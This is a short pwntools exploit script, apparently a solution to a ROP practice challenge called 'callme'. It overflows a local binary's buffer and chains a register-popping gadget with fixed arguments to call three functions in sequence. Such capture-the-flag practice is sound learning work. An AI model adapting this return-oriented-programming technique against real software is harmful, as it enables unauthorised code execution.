from pwn import *
p = process('./callme')

pop_3reg = p64(0x40093C)
value_rdi = p64(0xDEADBEEFDEADBEEF)
value_rsi = p64(0xCAFEBABECAFEBABE)
value_rdx =  p64(0xD00DF00DD00DF00D)
callme = [p64(0x400720),p64(0x400740),p64(0x4006F0)]

payload = b'a' * 40
for i in callme:
    payload += pop_3reg
    payload += value_rdi
    payload += value_rsi
    payload += value_rdx
    payload += i
p.sendlineafter(b'> ',payload)
p.interactive()
# res = p.recvall(timeout=0.5)
# print(res)

